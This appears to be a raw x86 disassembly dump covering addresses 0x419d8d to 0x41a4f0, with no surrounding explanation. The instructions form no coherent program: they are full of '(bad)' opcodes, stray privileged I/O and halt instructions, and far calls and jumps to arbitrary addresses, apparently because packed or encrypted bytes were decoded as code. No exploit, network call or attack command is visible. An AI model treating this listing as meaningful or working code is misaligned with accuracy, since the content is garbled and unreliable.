  419d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d8e:	pop    gs
  419d90:	xchg   edi,eax
  419d91:	out    dx,al
  419d92:	shl    cl,cl
  419d94:	mov    edi,0x27b99005
  419d99:	adc    dh,BYTE PTR [edx+0x3]
  419d9c:	int    0xed
  419d9e:	pusha  
  419d9f:	mov    esp,ebp
  419da1:	inc    esp
  419da2:	xor    BYTE PTR [ebx],al
  419da4:	jo     0x419d54
  419da6:	(bad)  
  419da8:	call   0x9104:0x9d9d910f
  419daf:	test   al,0x88
  419db1:	adc    ebx,DWORD PTR [ecx+0x52]
  419db4:	mov    ch,0xf2
  419db6:	cmp    DWORD PTR [ecx],0xd5b4060c
  419dbc:	aaa    
  419dbd:	mov    bh,0xbb
  419dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dc0:	inc    ebx
  419dc1:	loope  0x419d72
  419dc3:	mov    al,ds:0xe40ace9
  419dc8:	mov    BYTE PTR [ebx-0x47],cl
  419dcb:	lock mov eax,0xa2c69a75
  419dd1:	add    eax,0xa40d33e
  419dd6:	loope  0x419d9b
  419dd8:	push   edx
  419dd9:	gs push ds
  419ddb:	mov    ch,0xdd
  419ddd:	test   bh,0xa7
  419de0:	xor    al,0x26
  419de2:	call   edi
  419de4:	inc    esp
  419de5:	xor    eax,0xb7a0726d
  419dea:	stos   BYTE PTR es:[edi],al
  419deb:	cld    
  419dec:	scas   al,BYTE PTR es:[edi]
  419ded:	lods   eax,DWORD PTR ds:[esi]
  419dee:	pop    ds
  419def:	push   ecx
  419df0:	in     eax,0x85
  419df2:	les    edi,FWORD PTR [eax+esi*2-0xd]
  419df6:	xchg   esi,eax
  419df7:	aam    0xfa
  419df9:	sub    eax,0x7a13cfb1
  419dfe:	cmc    
  419dff:	fisttp WORD PTR [eax-0x4bdcec75]
  419e05:	hlt    
  419e06:	lods   al,BYTE PTR ds:[esi]
  419e07:	fwait
  419e08:	or     al,0x35
  419e0a:	repnz out dx,eax
  419e0c:	ds sbb al,0x78
  419e0f:	into   
  419e10:	aam    0x60
  419e12:	jg     0x419e00
  419e14:	xor    BYTE PTR [eax+0x6ac5259c],ah
  419e1a:	arpl   WORD PTR [ecx-0x7d94e277],cx
  419e20:	cld    
  419e21:	icebp  
  419e22:	in     eax,dx
  419e23:	aam    0xef
  419e25:	leave  
  419e26:	ss push ebx
  419e28:	inc    ecx
  419e29:	stos   BYTE PTR es:[edi],al
  419e2a:	xor    al,0x6
  419e2c:	mov    bl,dl
  419e2e:	push   ds
  419e2f:	jbe    0x419eaa
  419e31:	pop    ss
  419e32:	(bad)  
  419e33:	call   0xd622a6f0
  419e38:	mov    dl,0x9b
  419e3a:	(bad)  ds:[eax-0x761c82c0]
  419e41:	scas   eax,DWORD PTR es:[edi]
  419e42:	js     0x419e78
  419e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e45:	xor    eax,0x27810eb0
  419e4a:	sahf   
  419e4b:	add    ebp,esi
  419e4d:	test   DWORD PTR [eax-0x43],esp
  419e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e51:	ins    DWORD PTR es:[edi],dx
  419e52:	cmp    ch,dl
  419e54:	mov    BYTE PTR [ebx-0x1a],bh
  419e57:	fnstsw ax
  419e59:	or     al,0x74
  419e5b:	lds    eax,FWORD PTR fs:0x95be900
  419e62:	and    eax,esi
  419e64:	xchg   esp,eax
  419e65:	in     eax,dx
  419e66:	pusha  
  419e67:	scas   eax,DWORD PTR es:[edi]
  419e68:	jl     0x419e20
  419e6a:	adc    DWORD PTR [ebp+0x1e],edi
  419e6d:	pop    eax
  419e6e:	aas    
  419e6f:	(bad)  
  419e70:	mov    edi,0x1a4c803d
  419e75:	sub    ebx,edx
  419e77:	int3   
  419e78:	lods   al,BYTE PTR ds:[esi]
  419e79:	mov    bl,BYTE PTR [edi]
  419e7b:	test   DWORD PTR [ecx*4-0x43cb3d05],ebp
  419e82:	push   edi
  419e83:	in     eax,dx
  419e84:	enter  0xe707,0xd4
  419e88:	mov    esp,0xe0ed7a83
  419e8d:	retf   
  419e8e:	sub    dh,BYTE PTR [edx]
  419e90:	mov    BYTE PTR [edi-0x110add7d],cl
  419e96:	gs std 
  419e98:	xor    eax,0x71d67588
  419e9d:	(bad)  
  419e9e:	loope  0x419ef4
  419ea0:	mov    DWORD PTR [eax],ecx
  419ea2:	aas    
  419ea3:	sti    
  419ea4:	mov    ebp,0x89016c56
  419ea9:	scas   eax,DWORD PTR es:[edi]
  419eaa:	add    dh,BYTE PTR [edx-0x779315a]
  419eb0:	cmc    
  419eb1:	add    eax,0xdc2c3b60
  419eb6:	mov    esi,0x576af52b
  419ebb:	stos   DWORD PTR es:[edi],eax
  419ebc:	rol    BYTE PTR [ebp+0x7b],0x4c
  419ec0:	push   ebx
  419ec1:	pop    edi
  419ec2:	ja     0x419f1d
  419ec4:	ins    BYTE PTR es:[edi],dx
  419ec5:	add    ch,BYTE PTR [ebp+0x7a013e76]
  419ecb:	aad    0xda
  419ecd:	push   es
  419ece:	sbb    ecx,ecx
  419ed0:	pushf  
  419ed1:	mov    ebp,0xf87294f
  419ed6:	xor    edi,0x63e0b4bf
  419edc:	cmp    bh,bl
  419ede:	cmp    ebx,DWORD PTR [esi-0x50e4eab5]
  419ee4:	dec    esp
  419ee5:	sub    al,0xc2
  419ee7:	push   esp
  419ee8:	jp     0x419ebe
  419eea:	jns    0x419f13
  419eec:	mov    DWORD PTR [ebx],esi
  419eee:	jae    0x419eb7
  419ef0:	push   0x5c3bedba
  419ef5:	xlat   BYTE PTR ds:[ebx]
  419ef6:	sub    ah,dl
  419ef8:	popa   
  419ef9:	cmp    bh,ch
  419efb:	daa    
  419efc:	and    al,BYTE PTR [ebx]
  419efe:	int    0x33
  419f00:	mov    DWORD PTR [ebx-0x70],ecx
  419f03:	and    esi,DWORD PTR [edx]
  419f05:	or     eax,0x5963d47
  419f0a:	or     al,0x53
  419f0c:	(bad)  
  419f0d:	mov    ch,0xdc
  419f0f:	jle    0x419efa
  419f11:	jne    0x419eea
  419f13:	aas    
  419f14:	(bad)  
  419f15:	add    eax,0xe295a246
  419f1a:	jae    0x419f37
  419f1c:	xor    BYTE PTR [edx],al
  419f1e:	(bad)  
  419f1f:	call   0x4382904b
  419f24:	xchg   edx,eax
  419f25:	pop    ebx
  419f26:	push   ds
  419f27:	cdq    
  419f28:	push   ss
  419f29:	adc    BYTE PTR [eax],ah
  419f2b:	lods   al,BYTE PTR ds:[esi]
  419f2c:	add    BYTE PTR [edx+edi*2],al
  419f2f:	aam    0xf8
  419f31:	xor    BYTE PTR [eax+edi*2+0x59c69281],dl
  419f38:	xchg   ebp,eax
  419f39:	xchg   ebx,eax
  419f3a:	loopne 0x419ecb
  419f3c:	outs   dx,BYTE PTR ds:[esi]
  419f3d:	add    cl,cl
  419f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f40:	nop
  419f41:	jo     0x419f03
  419f43:	stos   BYTE PTR es:[edi],al
  419f44:	push   eax
  419f45:	dec    eax
  419f46:	sub    DWORD PTR [eax],ebx
  419f48:	(bad)
  419f4b:	hlt    
  419f4c:	sub    DWORD PTR [edx-0x41313ca0],ecx
  419f52:	data16 adc BYTE PTR ds:0xb15fb7f3,bl
  419f59:	jo     0x419fc0
  419f5b:	test   eax,0xd6c53a80
  419f60:	dec    ecx
  419f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f62:	ja     0x419f77
  419f64:	mov    bh,bh
  419f66:	fisttp WORD PTR [edi-0x42]
  419f69:	mov    bl,0x30
  419f6b:	std    
  419f6c:	and    DWORD PTR [edx-0x6],esp
  419f6f:	push   eax
  419f70:	je     0x419f56
  419f72:	jge    0x419f0e
  419f74:	mov    BYTE PTR [ecx],bh
  419f76:	ds pop esp
  419f78:	cs fdivr st(3),st
  419f7b:	jge    0x419fad
  419f7d:	ret    0xd254
  419f80:	ins    DWORD PTR es:[edi],dx
  419f81:	aas    
  419f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f83:	cmp    al,0xf9
  419f85:	xchg   esi,eax
  419f86:	scas   eax,DWORD PTR es:[edi]
  419f87:	push   0x36
  419f89:	sbb    DWORD PTR [esi],ebx
  419f8b:	sub    DWORD PTR [ebp+0x7c],ecx
  419f8e:	cmp    eax,0x7919b2c8
  419f93:	aam    0x92
  419f95:	retf   
  419f96:	mov    ds:0x4988d740,eax
  419f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9c:	mov    BYTE PTR [ebx],al
  419f9e:	in     al,dx
  419f9f:	sbb    DWORD PTR [ecx],ebx
  419fa1:	and    bh,BYTE PTR [ebx-0x6e0fd7e4]
  419fa7:	aam    0x2d
  419fa9:	(bad)  
  419faa:	mov    esp,0x639aa0d5
  419faf:	div    BYTE PTR [ecx-0x7604f273]
  419fb5:	xchg   DWORD PTR [eax-0x6f1dbe28],esp
  419fbb:	(bad)  [ebp-0x6bf95a7]
  419fc1:	add    bh,BYTE PTR [edx]
  419fc3:	jg     0x41a002
  419fc5:	ja     0x419fd9
  419fc7:	xchg   ebx,eax
  419fc8:	mov    BYTE PTR ds:0x10102748,ah
  419fce:	jb     0x419fed
  419fd0:	mov    ds:0xdd5b2fe,al
  419fd5:	push   edx
  419fd6:	fdivrp st(3),st
  419fd8:	jb     0x419fab
  419fda:	push   eax
  419fdb:	dec    edi
  419fdc:	sub    DWORD PTR [esi+0xf89fcb0],esi
  419fe2:	ror    BYTE PTR gs:[esi-0x49],0x39
  419fe7:	push   ds
  419fe8:	mov    DWORD PTR [edx],eax
  419fea:	xor    dh,ch
  419fec:	das    
  419fed:	push   ebp
  419fee:	aaa    
  419fef:	mov    eax,ecx
  419ff1:	xchg   edi,eax
  419ff2:	pusha  
  419ff3:	push   ebx
  419ff4:	lods   al,BYTE PTR ds:[esi]
  419ff5:	fmul   QWORD PTR [ebx]
  419ff7:	mov    ss,WORD PTR [edx]
  419ff9:	inc    esi
  419ffa:	cmp    dl,ah
  419ffc:	out    dx,eax
  419ffd:	mov    ecx,0xa7be76bf
  41a002:	adc    dl,BYTE PTR [esi]
  41a004:	pusha  
  41a005:	hlt    
  41a006:	fwait
  41a007:	jns    0x41a051
  41a009:	jb     0x419fa7
  41a00b:	lahf   
  41a00c:	and    al,0xcb
  41a00e:	push   edi
  41a00f:	xor    bl,BYTE PTR [esi-0xf43194d]
  41a015:	mov    ebp,0x98fd2f4
  41a01a:	(bad)  
  41a01b:	inc    esp
  41a01c:	pop    es
  41a01d:	repz pop edi
  41a01f:	fidiv  WORD PTR [eax+0x1dcb9ab8]
  41a025:	dec    edx
  41a026:	jl     0x41a015
  41a028:	or     BYTE PTR [edx-0x2caf4f61],al
  41a02e:	fcmovnbe st,st(5)
  41a030:	mov    dl,BYTE PTR [ebp+0x25c601e2]
  41a036:	inc    edi
  41a037:	fisttp WORD PTR [eax-0x300462eb]
  41a03d:	ss ret 0xae39
  41a041:	sbb    eax,0x18210448
  41a046:	jns    0x41a01d
  41a048:	fs retf 
  41a04a:	(bad)  
  41a04b:	mov    eax,0xcea721a7
  41a050:	jmp    0x8214:0x7c23309a
  41a057:	push   cx
  41a059:	xor    BYTE PTR ds:0x6198b794,ah
  41a05f:	inc    ebx
  41a060:	mov    DWORD PTR [ebx],edi
  41a062:	xor    al,0x2c
  41a064:	sub    ecx,esi
  41a066:	data16 mov bh,dl
  41a069:	je     0x41a03a
  41a06b:	mov    ecx,0x2062cdae
  41a070:	mov    DWORD PTR [ebp+0x23],ecx
  41a073:	lea    edi,[ecx+edx*1+0x1e]
  41a077:	aam    0xf7
  41a079:	cmp    eax,0xdae377e9
  41a07e:	cmp    DWORD PTR [ecx],ecx
  41a080:	mov    DWORD PTR [ecx-0x65d499b1],esp
  41a086:	push   ecx
  41a087:	mov    dl,0x83
  41a089:	jno    0x41a085
  41a08b:	test   DWORD PTR [eax+0x7cf1e5c0],0x891e07c2
  41a095:	das    
  41a096:	mov    fs,WORD PTR [ebp-0x78fea96a]
  41a09c:	fs add eax,esi
  41a09f:	pop    esi
  41a0a0:	aaa    
  41a0a1:	stc    
  41a0a2:	xchg   esp,eax
  41a0a3:	imul   esi,DWORD PTR [eax],0x11e96dc5
  41a0a9:	inc    ebp
  41a0aa:	inc    esi
  41a0ab:	stc    
  41a0ac:	imul   edi,ebp,0x2c76f3d
  41a0b2:	mov    ds:0xd026255,al
  41a0b7:	pop    edx
  41a0b8:	xor    al,0x7b
  41a0ba:	aas    
  41a0bb:	add    cl,BYTE PTR [ebp+ebp*2-0x67bdce6a]
  41a0c2:	xchg   BYTE PTR [eax+eax*4],dl
  41a0c5:	jmp    0xd65577ac
  41a0ca:	cmp    DWORD PTR [edi+0x38],ecx
  41a0cd:	jl     0x41a0cd
  41a0cf:	hlt    
  41a0d0:	ins    BYTE PTR es:[edi],dx
  41a0d1:	xor    eax,0xc4968b1f
  41a0d6:	inc    esi
  41a0d7:	out    0xfa,eax
  41a0d9:	push   es
  41a0da:	sbb    al,0xd4
  41a0dc:	call   0xd5c5cdb0
  41a0e1:	loop   0x41a0df
  41a0e3:	jl     0x41a06d
  41a0e5:	mov    ebp,0x81917614
  41a0ea:	jmp    0x2643ce7f
  41a0ef:	dec    esi
  41a0f0:	pop    esp
  41a0f1:	pop    ds
  41a0f2:	pusha  
  41a0f3:	imul   edi,DWORD PTR [edx-0x2d],0xe5709b62
  41a0fa:	mov    dl,BYTE PTR [edx]
  41a0fc:	or     DWORD PTR [ecx],ebx
  41a0fe:	shr    BYTE PTR [eax],1
  41a100:	push   eax
  41a101:	xchg   ecx,eax
  41a102:	pop    ebp
  41a103:	aam    0xe0
  41a105:	fidivr DWORD PTR [eax-0x61]
  41a108:	(bad)  
  41a109:	addr16 leave 
  41a10b:	dec    ecx
  41a10c:	mov    BYTE PTR [ebp+0x567d33f8],dl
  41a112:	adc    eax,0x3402a9cc
  41a117:	addr16 aaa 
  41a119:	mov    ecx,0x2898a058
  41a11e:	es pop ecx
  41a120:	mov    ecx,ebp
  41a122:	aaa    
  41a123:	out    dx,al
  41a124:	pop    ecx
  41a125:	fcmove st,st(5)
  41a127:	outs   dx,DWORD PTR ds:[esi]
  41a128:	mov    edx,0xbcb0a402
  41a12d:	(bad)  
  41a12e:	sti    
  41a12f:	into   
  41a130:	pop    ss
  41a131:	push   ebp
  41a132:	pop    ds
  41a133:	sbb    DWORD PTR [esp+esi*1+0x2],esp
  41a137:	lock shl BYTE PTR [edi],0x99
  41a13b:	aam    0x24
  41a13d:	xor    BYTE PTR [edi-0x70814b5a],dh
  41a143:	push   ebx
  41a144:	mov    BYTE PTR [ebp+0x70802c07],cl
  41a14a:	outs   dx,DWORD PTR ds:[esi]
  41a14b:	stos   DWORD PTR es:[edi],eax
  41a14c:	inc    eax
  41a14d:	add    BYTE PTR [edi+ecx*2+0x27],al
  41a151:	iret   
  41a152:	hlt    
  41a153:	jns    0x41a0e7
  41a155:	in     al,dx
  41a156:	shl    BYTE PTR [esi+0x591f68f2],1
  41a15c:	xchg   edi,eax
  41a15d:	fcomp  st(5)
  41a15f:	pop    edx
  41a160:	shl    cl,cl
  41a162:	repnz aad 0x3c
  41a165:	or     DWORD PTR [ecx-0x554a7e51],edx
  41a16b:	mov    al,0xad
  41a16d:	ffree  st(7)
  41a16f:	test   DWORD PTR [eax+0x26c71aef],0xcad45653
  41a179:	and    BYTE PTR [eax+ebx*4-0x3fdccd91],0x88
  41a181:	imul   esp,DWORD PTR [eax-0x6d],0x3708c15e
  41a188:	lar    ecx,dx
  41a18b:	push   ds
  41a18c:	fistp  WORD PTR [edi]
  41a18e:	ret    0x557a
  41a191:	dec    esp
  41a192:	pop    ecx
  41a193:	leave  
  41a194:	mul    DWORD PTR ds:0x235e97b
  41a19a:	mov    ch,0x70
  41a19c:	add    bx,WORD PTR [ecx]
  41a19f:	in     al,dx
  41a1a0:	push   ds
  41a1a1:	add    dl,dl
  41a1a3:	(bad)  
  41a1a5:	xchg   DWORD PTR [esp+edx*1],esp
  41a1a8:	rcr    DWORD PTR [ecx],0x1f
  41a1ab:	pop    ds
  41a1ac:	mov    al,0x68
  41a1ae:	push   0x4ace328
  41a1b3:	sbb    al,0x3e
  41a1b5:	mov    bh,0x1f
  41a1b7:	scas   eax,DWORD PTR es:[edi]
  41a1b8:	or     al,0xf5
  41a1ba:	ret    
  41a1bb:	cmp    esi,esi
  41a1bd:	(bad)  
  41a1be:	pusha  
  41a1bf:	retf   
  41a1c0:	in     eax,dx
  41a1c1:	inc    ebp
  41a1c2:	jns    0x41a150
  41a1c4:	mov    BYTE PTR [ebp+ecx*8-0x2c],bl
  41a1c8:	lods   al,BYTE PTR ds:[esi]
  41a1c9:	pop    ss
  41a1ca:	bound  edx,QWORD PTR [ebx+ecx*4+0x7]
  41a1ce:	ret    
  41a1cf:	or     DWORD PTR [eax+0x3810ecab],ecx
  41a1d5:	xor    cl,BYTE PTR [ebx]
  41a1d7:	fcmovbe st,st(7)
  41a1d9:	adc    al,0x7c
  41a1db:	pushf  
  41a1dc:	sub    esi,DWORD PTR [eax+0x21385727]
  41a1e2:	or     ecx,DWORD PTR [ebx+0x69]
  41a1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e6:	pusha  
  41a1e7:	pop    ebx
  41a1e8:	dec    esp
  41a1e9:	out    0x16,al
  41a1eb:	fmul   DWORD PTR [esi-0x74]
  41a1ee:	call   esp
  41a1f0:	sbb    esp,DWORD PTR [bp-0x6d1]
  41a1f5:	mov    esi,0x3989c313
  41a1fa:	adc    BYTE PTR [edi],ah
  41a1fc:	test   ecx,ebp
  41a1fe:	xor    eax,0xd405ee8f
  41a203:	adc    al,0x78
  41a205:	mov    ch,BYTE PTR [ebp+0x6535b0fe]
  41a20b:	stos   DWORD PTR es:[edi],eax
  41a20c:	xchg   edi,eax
  41a20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a20f:	cmp    dl,bh
  41a211:	adc    al,BYTE PTR [ebx]
  41a213:	std    
  41a214:	scas   al,BYTE PTR es:[edi]
  41a215:	pop    ds
  41a216:	xor    ch,BYTE PTR ds:0x3f09492a
  41a21c:	sbb    DWORD PTR ds:0x6fac90e1,edi
  41a222:	dec    edi
  41a223:	push   cs
  41a224:	adc    DWORD PTR [ecx],0x82d6d1c4
  41a22a:	pusha  
  41a22b:	es add eax,0x3962025c
  41a231:	jp     0x41a204
  41a233:	pop    ebp
  41a234:	xchg   edi,eax
  41a235:	cmp    bh,BYTE PTR [ebx]
  41a237:	add    eax,DWORD PTR ds:[bx+si]
  41a23b:	sub    dh,BYTE PTR [edi+0x4c]
  41a23e:	daa    
  41a23f:	loope  0x41a282
  41a241:	add    bh,BYTE PTR [edx+0x4e]
  41a244:	loopne 0x41a216
  41a246:	sub    dh,ch
  41a248:	mov    gs,WORD PTR [ebp+0x1e]
  41a24b:	sbb    edi,esi
  41a24d:	fs xchg edi,eax
  41a24f:	mov    ds,edx
  41a251:	dec    eax
  41a252:	js     0x41a229
  41a254:	xchg   esp,eax
  41a255:	push   es
  41a256:	push   es
  41a257:	jo     0x41a216
  41a259:	retf   
  41a25a:	adc    DWORD PTR [edx+0x267267ba],edx
  41a260:	and    DWORD PTR [ebp+0x29bd380],edx
  41a266:	cs sub edx,ebp
  41a269:	idiv   BYTE PTR [ecx+0x5e0d4e62]
  41a26f:	jne    0x41a1fd
  41a271:	xor    bl,BYTE PTR [esi]
  41a273:	(bad)  
  41a274:	jbe    0x41a2bc
  41a276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a277:	(bad)  
  41a278:	jmp    0x41a27c
  41a27a:	add    ax,0xcefa
  41a27e:	add    eax,0x97a11cbc
  41a283:	leave  
  41a284:	jecxz  0x41a288
  41a286:	mov    ds:0xc05bd49a,eax
  41a28b:	xor    al,BYTE PTR ds:[edx]
  41a28e:	test   BYTE PTR [esi-0x54b30289],0x34
  41a295:	outs   dx,DWORD PTR ds:[esi]
  41a296:	scas   al,BYTE PTR es:[edi]
  41a297:	int    0xcb
  41a299:	jle    0x41a2ba
  41a29b:	and    DWORD PTR [ecx],ebp
  41a29d:	push   ss
  41a29e:	xor    ecx,esp
  41a2a0:	adc    ah,ch
  41a2a2:	call   0xc7f8:0x92fbe8d4
  41a2a9:	ds ss push 0xa7a0cf88
  41a2b0:	stos   DWORD PTR es:[edi],eax
  41a2b1:	fild   DWORD PTR [ebp-0x61fd80e3]
  41a2b7:	enter  0x98cb,0x36
  41a2bb:	or     al,0x88
  41a2bd:	inc    esp
  41a2be:	push   ds
  41a2bf:	fcomi  st,st(0)
  41a2c1:	and    ah,BYTE PTR [esi+0x22]
  41a2c4:	aam    0xe9
  41a2c6:	not    ch
  41a2c8:	push   ebx
  41a2c9:	adc    al,0xbe
  41a2cb:	fwait
  41a2cc:	jnp    0x41a344
  41a2ce:	call   FWORD PTR [ecx+ecx*4+0x79]
  41a2d2:	les    ebx,FWORD PTR [ebx+ecx*8+0xaf8be85]
  41a2d9:	add    ecx,DWORD PTR [esi+0x90890d7]
  41a2df:	out    dx,al
  41a2e0:	sub    ch,BYTE PTR [eax-0x767771eb]
  41a2e6:	mov    al,ds:0x8294b0a4
  41a2eb:	test   DWORD PTR [edx+eax*1],ebp
  41a2ee:	pop    edx
  41a2ef:	mov    cl,0xca
  41a2f2:	or     eax,0x1e1dd0cf
  41a2f7:	xchg   ebx,eax
  41a2f8:	ja     0x41a376
  41a2fa:	adc    al,0xe2
  41a2fc:	enter  0x69f8,0xd4
  41a300:	fst    DWORD PTR [esi+0x75]
  41a303:	in     al,0x7a
  41a305:	in     al,0xd0
  41a307:	push   edx
  41a308:	mov    BYTE PTR [edi-0x75],bl
  41a30b:	loop   0x41a2db
  41a30d:	jg     0x41a2f6
  41a30f:	std    
  41a310:	inc    edx
  41a311:	(bad)  
  41a312:	hlt    
  41a313:	aam    0x69
  41a315:	je     0x41a313
  41a317:	pop    ebp
  41a318:	sub    esp,DWORD PTR [esi+esi*4+0x19]
  41a31c:	idiv   DWORD PTR [ecx]
  41a31e:	(bad)  
  41a31f:	aad    0x5c
  41a321:	(bad)  
  41a322:	stc    
  41a323:	aas    
  41a324:	test   bl,al
  41a326:	jmp    0x41a2fc
  41a328:	or     cl,ah
  41a32a:	jg     0x41a317
  41a32c:	add    bh,BYTE PTR [edx-0x4e0eb9fc]
  41a332:	jp     0x41a2cd
  41a334:	addr16 (bad) 
  41a336:	loopne 0x41a389
  41a338:	ret    0x8d9c
  41a33b:	jb     0x41a39b
  41a33d:	add    al,BYTE PTR [eax]
  41a33f:	inc    ebx
  41a340:	sbb    al,0x70
  41a342:	ret    
  41a343:	adc    eax,0xf360dc98
  41a348:	push   ds
  41a349:	sti    
  41a34a:	adc    DWORD PTR [edi],0xd5e979b6
  41a350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a351:	dec    edx
  41a352:	and    eax,0xfa5a82d2
  41a357:	adc    ecx,DWORD PTR [ecx+0xc93d7f7]
  41a35d:	adc    ebp,DWORD PTR [si]
  41a360:	fstp   DWORD PTR [edi]
  41a362:	shr    BYTE PTR [ebx+0x36],cl
  41a365:	ficomp DWORD PTR [edx]
  41a367:	test   BYTE PTR [eax+0x891a141],dh
  41a36d:	inc    ebx
  41a36e:	nop
  41a36f:	add    al,BYTE PTR [esi]
  41a371:	mov    dh,0xc3
  41a373:	shl    BYTE PTR [ebp+0x7d],1
  41a376:	push   edi
  41a377:	repz adc BYTE PTR [edx-0x1f],cl
  41a37b:	xchg   esp,eax
  41a37c:	ret    0x7c9d
  41a37f:	dec    BYTE PTR [eax-0x656cea8b]
  41a385:	or     cl,cl
  41a387:	(bad)  
  41a388:	ret    
  41a389:	xor    cl,BYTE PTR [edx-0x10]
  41a38c:	in     al,dx
  41a38d:	cdq    
  41a38e:	xor    eax,0xae458982
  41a393:	pop    ebx
  41a394:	ins    DWORD PTR es:[edi],dx
  41a395:	lds    esp,FWORD PTR [edi+0x61d3c63]
  41a39b:	push   esi
  41a39c:	push   edi
  41a39d:	and    DWORD PTR [ebp-0x2a746c9],edi
  41a3a3:	out    0x88,eax
  41a3a5:	gs enter 0xeb24,0xb8
  41a3aa:	shl    DWORD PTR [esp-0x7977e7ba],cl
  41a3b1:	pop    ds
  41a3b2:	inc    eax
  41a3b3:	ds push esp
  41a3b5:	cmp    eax,0x9730744c
  41a3ba:	leave  
  41a3bb:	mov    al,0x88
  41a3bd:	cmp    ebp,DWORD PTR [eax]
  41a3bf:	test   al,0xee
  41a3c1:	lahf   
  41a3c2:	stos   DWORD PTR es:[edi],eax
  41a3c3:	inc    esp
  41a3c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3c5:	add    eax,0x3afcf48c
  41a3ca:	push   ss
  41a3cb:	dec    eax
  41a3cc:	addr16 mov dh,0x60
  41a3cf:	or     eax,0xccad8359
  41a3d4:	shl    BYTE PTR [ebx+esi*8-0x29b9d158],1
  41a3db:	pop    edx
  41a3dc:	mov    ds,WORD PTR ss:[edi]
  41a3df:	push   ecx
  41a3e0:	jle    0x41a3c2
  41a3e2:	outs   dx,BYTE PTR ds:[esi]
  41a3e3:	mov    al,ds:0xd4def0d2
  41a3e8:	mov    bl,0xd5
  41a3ea:	sti    
  41a3eb:	iret   
  41a3ec:	int3   
  41a3ed:	sbb    al,0xa
  41a3ef:	fisttp QWORD PTR [edi-0x2cf7f5ad]
  41a3f5:	xlat   BYTE PTR ds:[ebx]
  41a3f6:	mov    dh,BYTE PTR [ebp-0x2b581ffa]
  41a3fc:	push   0xffffffbf
  41a3fe:	call   0x89ae:0xf1c3245b
  41a405:	iret   
  41a406:	iret   
  41a407:	mov    ecx,DWORD PTR [edi+0x1f]
  41a40a:	jno    0x41a46c
  41a40c:	xor    al,0x3
  41a40e:	mov    al,0xf
  41a410:	rol    BYTE PTR [esi-0x75],cl
  41a413:	mov    eax,ds:0x3f6028e8
  41a418:	or     eax,0xb9da0c16
  41a41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41e:	and    BYTE PTR ds:0x123a0201,cl
  41a424:	test   esi,esi
  41a426:	adc    dl,dl
  41a428:	pop    ebx
  41a429:	or     al,0x27
  41a42b:	mov    bl,0x89
  41a42d:	cmp    eax,0x1b80ec1e
  41a432:	dec    ebp
  41a433:	and    esi,esi
  41a435:	add    dl,BYTE PTR [esi-0x49]
  41a438:	push   eax
  41a43a:	push   ecx
  41a43b:	mov    ah,0xa6
  41a43d:	fcomp  QWORD PTR [edi]
  41a43f:	rcr    ecx,0x14
  41a442:	arpl   WORD PTR [eax-0x24],di
  41a445:	jmp    0x6697b53
  41a44a:	adc    DWORD PTR [ecx-0x616b7241],ebp
  41a450:	mov    DWORD PTR [ecx-0x23],ecx
  41a453:	pop    eax
  41a454:	add    al,0x78
  41a456:	inc    edx
  41a457:	fdiv   DWORD PTR [eax+0x3]
  41a45a:	dec    eax
  41a45b:	dec    edx
  41a45c:	in     eax,0xc6
  41a45e:	xchg   edx,eax
  41a45f:	inc    ebx
  41a460:	add    eax,0x82b31f0d
  41a465:	cli    
  41a466:	sahf   
  41a467:	xor    ch,BYTE PTR [eax]
  41a469:	pop    edx
  41a46a:	out    0xd4,eax
  41a46c:	push   ds
  41a46d:	cli    
  41a46e:	shl    DWORD PTR [ebp-0x32],0x6a
  41a472:	or     al,0x1c
  41a474:	inc    dx
  41a476:	pop    ds
  41a477:	std    
  41a478:	ret    
  41a479:	sar    eax,0x1f
  41a47c:	or     bh,0x53
  41a47f:	aam    0x5d
  41a481:	xor    al,0x37
  41a483:	shr    BYTE PTR [edi-0x7643bba9],1
  41a489:	inc    edi
  41a48a:	mov    eax,0x79312a07
  41a48f:	jno    0x41a496
  41a491:	dec    ecx
  41a492:	mov    dl,0x28
  41a494:	std    
  41a495:	add    al,dl
  41a497:	adc    al,0x62
  41a499:	dec    esp
  41a49a:	jg     0x41a519
  41a49c:	mov    bl,BYTE PTR [ecx]
  41a49e:	xlat   BYTE PTR ds:[ebx]
  41a49f:	mov    dl,0xca
  41a4a1:	repnz xor bh,BYTE PTR [ecx+0x8]
  41a4a5:	mov    esi,0x2b8d0fc
  41a4aa:	push   esp
  41a4ab:	inc    ebp
  41a4ac:	pop    eax
  41a4ad:	in     al,dx
  41a4ae:	sub    bh,bl
  41a4b0:	pushf  
  41a4b1:	outs   dx,DWORD PTR ds:[esi]
  41a4b2:	xchg   edi,eax
  41a4b3:	fild   WORD PTR [edx+0x2]
  41a4b6:	loope  0x41a4f2
  41a4b8:	sub    bl,bh
  41a4ba:	jae    0x41a536
  41a4bc:	jno    0x41a4b3
  41a4be:	shl    DWORD PTR [esp+edi*4+0x37],cl
  41a4c2:	mov    bl,0xd4
  41a4c4:	pop    edi
  41a4c5:	push   ss
  41a4c6:	ret    
  41a4c7:	sbb    ch,bh
  41a4c9:	jae    0x41a46c
  41a4cb:	ins    BYTE PTR es:[edi],dx
  41a4cc:	jle    0x41a4a0
  41a4ce:	gs sbb eax,esi
  41a4d1:	xlat   BYTE PTR ds:[ebx]
  41a4d2:	(bad)  
  41a4d3:	fdivr  st(2),st
  41a4d5:	mov    edi,0xb0ea2428
  41a4da:	mov    edx,0x88fc5daa
  41a4df:	or     eax,0xc9b205a6
  41a4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e5:	out    dx,eax
  41a4e6:	gs gs mov esi,0x7cb6bc43
  41a4ed:	ret    0x5926
  41a4f0:	leave  
